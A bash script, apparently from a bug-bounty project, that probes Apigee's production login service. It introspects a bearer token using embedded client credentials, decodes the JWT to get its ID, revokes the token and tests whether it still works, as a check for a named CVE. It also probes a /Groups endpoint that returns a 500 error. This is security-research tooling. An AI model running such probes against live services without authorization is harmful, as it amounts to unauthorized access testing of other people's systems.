#!/bin/bash
# Focused probe: token introspection, revocation bypass test, /Groups 500 investigation.
# Runs independently of management API baseline (which requires org membership).
# Usage: export APIGEE_TOKEN="$(cat /tmp/apigee_token.txt)" && bash scripts/apigee_token_and_groups.sh
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

TOKEN="${APIGEE_TOKEN:-}"
UAA="https://login.apigee.com"
OUTDIR="$HOME/bug-bounty-hunting-/results/apigee/03-candidates"
mkdir -p "$OUTDIR"
OUT="$OUTDIR/APG-L004-token-revoke-groups.txt"

if [ -z "$TOKEN" ]; then
  echo "ERROR: export APIGEE_TOKEN=\"\$(cat /tmp/apigee_token.txt)\" first"
  exit 1
fi

echo "=== Token Introspection + Revocation Bypass + /Groups Anomaly ===" | tee "$OUT"
echo "Date: $(date -u)" | tee -a "$OUT"
echo | tee -a "$OUT"

# 1. /userinfo — verify token validity
echo "--- [1] GET /userinfo (token validity baseline) ---" | tee -a "$OUT"
UINFO=$(/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/userinfo")
echo "$UINFO" | tee -a "$OUT"
echo | tee -a "$OUT"

if ! echo "$UINFO" | /usr/bin/grep -q "HTTP_200"; then
  echo "Token rejected at /userinfo — may have expired. Get a fresh passcode." | tee -a "$OUT"
  # Don't exit — still run the /Groups investigation
fi

# 2. /check_token — introspect token to get JTI
echo "--- [2] POST /check_token (introspection via edgecli Basic auth) ---" | tee -a "$OUT"
CHECK=$(/usr/bin/curl -sk --max-time 10 \
  -u "edgecli:edgeclisecret" \
  -X POST "${UAA}/check_token" \
  -d "token=${TOKEN}")
echo "$CHECK" | python3 -m json.tool 2>/dev/null || echo "$CHECK"
JTI=$(echo "$CHECK" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('jti',''))" 2>/dev/null)

# Fallback: extract JTI directly from JWT payload (edgecli doesn't have tokens.read)
if [ -z "$JTI" ]; then
  echo "check_token blocked (edgecli lacks tokens.read). Extracting JTI from JWT payload..." | tee -a "$OUT"
  JTI=$(echo "$TOKEN" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
if len(parts) >= 2:
    p = parts[1] + '=' * (4 - len(parts[1])%4)
    d = json.loads(base64.b64decode(p))
    print(d.get('jti',''))
" 2>/dev/null)
fi
echo "JTI: $JTI" | tee -a "$OUT"
echo | tee -a "$OUT"

# 3. Token revocation bypass (APG-L004 / CVE-2026-22723)
if [ -n "$JTI" ]; then
  echo "--- [3] Pre-revoke /userinfo (should 200) ---" | tee -a "$OUT"
  PRE=$(/usr/bin/curl -sk --max-time 10 \
    -H "Authorization: Bearer $TOKEN" \
    -w "HTTP_%{http_code}" \
    "${UAA}/userinfo" -o /dev/null)
  echo "Pre-revoke: $PRE" | tee -a "$OUT"

  echo "--- [3b] DELETE /oauth/token/revoke/${JTI} ---" | tee -a "$OUT"
  REV=$(/usr/bin/curl -sk --max-time 10 \
    -H "Authorization: Bearer $TOKEN" \
    -X DELETE "${UAA}/oauth/token/revoke/${JTI}" \
    -w "\nHTTP_%{http_code}")
  echo "Revoke response: $REV" | tee -a "$OUT"
  echo | tee -a "$OUT"

  echo "--- [3c] Post-revoke /userinfo (should 401 if revocation works) ---" | tee -a "$OUT"
  POST=$(/usr/bin/curl -sk --max-time 10 \
    -H "Authorization: Bearer $TOKEN" \
    -w "HTTP_%{http_code}" \
    "${UAA}/userinfo" -o /dev/null)
  echo "Post-revoke: $POST" | tee -a "$OUT"
  echo | tee -a "$OUT"

  echo "=== VERDICT (APG-L004) ===" | tee -a "$OUT"
  if echo "$POST" | /usr/bin/grep -q "200"; then
    echo "*** CVE-2026-22723 CONFIRMED: revoked token still valid at /userinfo! ***" | tee -a "$OUT"
  elif echo "$POST" | /usr/bin/grep -q "401"; then
    echo "Token properly invalidated — revocation works. CVE-2026-22723 not applicable." | tee -a "$OUT"
  else
    echo "Unexpected post-revoke response: $POST — inspect manually." | tee -a "$OUT"
  fi
else
  echo "Could not get JTI from /check_token. Skipping revocation test." | tee -a "$OUT"
fi
echo | tee -a "$OUT"

# 4. /Groups anomaly investigation
echo "--- [4] GET /Groups (500 anomaly investigation) ---" | tee -a "$OUT"
for i in 1 2 3; do
  echo "  Attempt $i:" | tee -a "$OUT"
  GOUT=$(/usr/bin/curl -sk --max-time 10 \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json" \
    -w "\nHTTP_%{http_code}" \
    "${UAA}/Groups")
  echo "$GOUT" | tee -a "$OUT"
  echo | tee -a "$OUT"
done

echo "--- [4b] GET /Groups WITHOUT Bearer token (should be 401) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/Groups" | tee -a "$OUT"
echo | tee -a "$OUT"

echo "--- [4c] GET /Groups with bad token (should be 401/403) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer AAAA.BBBB.CCCC" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/Groups" | tee -a "$OUT"
echo | tee -a "$OUT"

echo "=== VERDICT (/Groups) ===" | tee -a "$OUT"
echo "Expected: valid token → 403 (insufficient_scope)." | tee -a "$OUT"
echo "Observed: valid token → 500 with prompts JSON (anomalous)." | tee -a "$OUT"
echo "Check if: no-token → 401, bad-token → 401, valid-token → 500." | tee -a "$OUT"
echo "If the 500 is token-scope-dependent (only with valid edgecli token)," | tee -a "$OUT"
echo "it may indicate an unhandled exception in the SCIM groups authorization path." | tee -a "$OUT"
echo | tee -a "$OUT"
echo "Done. Results: $OUT"
